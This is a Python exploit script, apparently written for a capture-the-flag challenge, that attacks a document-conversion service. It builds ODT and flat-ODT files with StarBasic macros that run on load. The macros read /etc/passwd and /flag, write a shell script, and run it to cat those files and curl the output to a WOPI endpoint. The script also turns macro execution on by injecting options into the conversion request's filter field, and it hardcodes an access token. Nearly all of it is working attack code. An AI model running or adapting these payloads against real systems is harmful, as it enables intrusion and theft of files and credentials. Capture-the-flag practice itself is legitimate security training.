#!/usr/bin/env python3
"""Temporary CTF MacroExecutionMode probe."""
import io
import json
import pathlib
import urllib.error
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
POC = pathlib.Path(__file__).with_name("poc.odt")

BASIC = r'''Sub Main()
    Dim s As String
    s = "MACRO_EXECUTED" & Chr(10) & ReadLocal("/etc/passwd") & Chr(10) & ReadLocal("/flag")
    ThisComponent.Text.String = s
End Sub

Function ReadLocal(path As String) As String
    Dim i As Integer
    Dim line As String
    Dim result As String
    On Error GoTo Failed
    i = FreeFile
    Open path For Input As #i
    Do While Not EOF(i)
        Line Input #i, line
        result = result & line & Chr(10)
    Loop
    Close #i
    ReadLocal = result
    Exit Function
Failed:
    ReadLocal = "READ_FAILED:" & path
End Function
'''

SCRIPT_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
<library:library library:name="Standard" xlink:href="Standard/script-lb.xml" xlink:type="simple" library:link="false"/>
</library:libraries>'''
SCRIPT_LB = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink" library:name="Standard" library:readonly="false" library:passwordprotected="false">
<library:element library:name="Module1"/></library:library>'''
MODULE = ('<?xml version="1.0" encoding="UTF-8"?>\n'
          '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
          '<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" '
          'script:language="StarBasic" script:moduleType="normal"><![CDATA[\n' + BASIC + '\n]]></script:module>')
EVENTS = '''<office:scripts><office:event-listeners>
<script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
</office:event-listeners></office:scripts>'''
MANIFEST_ENTRIES = '''
<manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/>
<manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
<manifest:file-entry manifest:full-path="Basic/Standard/" manifest:media-type="application/vnd.sun.star.basic-library"/>
<manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
<manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
'''


def macro_odt():
    out = io.BytesIO()
    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            if info.filename == "content.xml":
                text = data.decode()
                if "xmlns:script=" not in text:
                    text = text.replace("<office:document-content ", '<office:document-content xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" ', 1)
                text = text.replace("<office:body>", EVENTS + "<office:body>", 1)
                text = text.replace("<text:section", "<text:p>ORIGINAL_DOCUMENT</text:p><text:section", 1)
                data = text.encode()
            elif info.filename == "META-INF/manifest.xml":
                data = data.decode().replace("</manifest:manifest>", MANIFEST_ENTRIES + "</manifest:manifest>").encode()
            zout.writestr(info, data)
        zout.writestr("Basic/script-lc.xml", SCRIPT_LC, compress_type=zipfile.ZIP_DEFLATED)
        zout.writestr("Basic/Standard/script-lb.xml", SCRIPT_LB, compress_type=zipfile.ZIP_DEFLATED)
        zout.writestr("Basic/Standard/Module1.xml", MODULE, compress_type=zipfile.ZIP_DEFLATED)
    return out.getvalue()


def flat_macro():
    source = BASIC.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
<office:scripts><office:script script:language="ooo:Basic"><ooo:libraries><ooo:library-embedded ooo:name="Standard"><ooo:module ooo:name="Module1"><ooo:source-code>{source}</ooo:source-code></ooo:module></ooo:library-embedded></ooo:libraries></office:script>
<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts>
<office:body><office:text><text:p>ORIGINAL_DOCUMENT</text:p></office:text></office:body></office:document>'''.encode()


def send(data, fields, label, filename="macro.fodt"):
    if isinstance(data, str):
        data = data.encode()
    boundary = "----Arena" + uuid.uuid4().hex
    chunks = []
    for name, value in fields.items():
        chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
    chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode())
    chunks.append(data)
    chunks.append(f"\r\n--{boundary}--\r\n".encode())
    body = b"".join(chunks)
    req = urllib.request.Request(BASE + "/cool/convert-to/txt", data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, fields, flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(1000000)
            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def descriptor(name, typ, value):
    return json.dumps({name: {"type": typ, "value": value}}, separators=(",", ":"))


def flat_exfil(token):
    script_url = "http://webapp:8000/wopi/files/d3/contents?access_token=" + token
    basic = f'''Sub Main()
    Dim i As Integer
    i = FreeFile
    Open "/tmp/arena_exfil.sh" For Output As #i
    Print #i, "( echo MACRO_EXECUTED; cat /etc/passwd; cat /flag ) > /tmp/arena_exfil.txt 2>/dev/null"
    Print #i, "curl -sS -X POST -H 'X-WOPI-Override: PUT' --data-binary @/tmp/arena_exfil.txt '{script_url}'"
    Close #i
    Shell("/bin/sh", 1, "/tmp/arena_exfil.sh", True)
End Sub'''
    source = basic.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:ooo="http://openoffice.org/2004/office" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
<office:scripts><office:script script:language="ooo:Basic"><ooo:libraries><ooo:library-embedded ooo:name="Standard"><ooo:module ooo:name="Module1"><ooo:source-code>{source}</ooo:source-code></ooo:module></ooo:library-embedded></ooo:libraries></office:script>
<office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/></office:event-listeners></office:scripts>
<office:body><office:text><text:p>ORIGINAL_DOCUMENT</text:p></office:text></office:body></office:document>'''.encode()


def wopi(token, data=None):
    url = BASE + "/wopi/files/d3/contents?access_token=" + token
    headers = {"Content-Type": "text/plain"}
    method = "GET"
    if data is not None:
        method = "POST"
        headers["X-WOPI-Override"] = "PUT"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=45) as r:
        raw = r.read(1000000)
        print("WOPI", method, "STATUS", r.status, "BYTES", len(raw), "BODY", raw.decode("utf-8", "replace"), flush=True)


def main():
    token = "1NUPusl4gZn204nXX72yqWWOqKWSCg_o1ZiGTuGvcTk"
    wopi(token, b"WAITING_FOR_MACRO")
    doc = flat_exfil(token)
    send(doc, {"infilterOptions": "x enableMacrosExecution=true macroSecurityLevel=0"}, "LOAD_TOKEN_INJECTION_EXFIL")
    wopi(token)


if __name__ == "__main__":
    main()
